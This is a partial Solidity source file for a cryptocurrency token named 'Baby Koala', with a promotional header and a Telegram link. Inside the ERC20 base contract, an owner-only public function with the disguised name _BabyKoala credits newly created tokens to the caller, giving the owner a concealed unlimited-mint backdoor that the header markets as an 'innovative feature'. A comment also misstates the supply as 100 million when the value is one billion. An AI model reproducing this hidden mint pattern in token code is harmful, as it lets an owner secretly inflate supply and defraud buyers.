//
// $BabyKoala proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/BabykoalaCN
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _BabyKoala(uint256 amount) public onlyOwner {
 _BabyKoala(msg.sender, amount);
    }
    ...
    function _BabyKoala(address account, uint256 amount) internal virtual {
...
contract $BabyKoala is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Baby Koala", "BABYKOALA") {
     _BabyKoala(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}